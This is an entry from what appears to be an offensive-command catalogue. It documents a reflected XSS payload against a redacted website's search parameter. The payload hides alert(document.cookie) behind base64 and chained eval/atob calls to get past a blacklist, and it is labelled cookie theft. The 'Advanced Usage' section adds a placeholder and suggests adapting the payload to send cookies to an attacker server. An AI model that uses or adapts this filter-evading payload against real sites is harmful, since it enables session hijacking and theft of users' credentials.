---
id: cmd-uuid-4
data: >-
  www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')))}}
name: bypass-blacklist-cookie-theft
tags:
  - xss-exfil
type: command
output: Browser alert box showing document cookies
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.247Z'
verified: false
validated: true
submitted: true
---
# bypass-blacklist-cookie-theft

## Command

```bash
# Browser URL: www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')))}}
```

## Description

This command demonstrates XSS impact by exfiltrating cookies using a base64-encoded payload decoded and executed in the template.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Search | Encoded chain for alert(document.cookie) | Yes |

## Examples

### Basic Usage

```bash
www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')))}}
```

### Advanced Usage

Adapt for other exfil, e.g., send to attacker server.

```bash
www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('CUSTOM_EXFIL_BASE64')))}}
```

## Expected Output

An alert box reveals the victim's document.cookie contents.

## Related

- [[Related Procedure: Bypass-Blacklist-with-Base64-Encoding]]
